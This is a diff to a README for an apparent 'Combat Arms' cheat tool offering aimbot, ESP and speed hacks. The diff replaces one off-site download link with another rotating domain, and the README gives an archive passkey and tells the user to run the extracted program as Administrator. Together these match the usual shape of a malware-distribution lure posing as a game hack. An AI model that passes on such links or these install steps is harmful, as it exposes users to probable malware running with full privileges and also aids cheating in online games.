@@ -6,7 +6,7 @@ Combat Arms trainer with aimbot, ESP, unlock all weapons, speed hack, and more. 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular mods like **HackMania** and **Combat Arms Trainer Pro**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Combat Arms.
 4. Run the hack **as Administrator**.
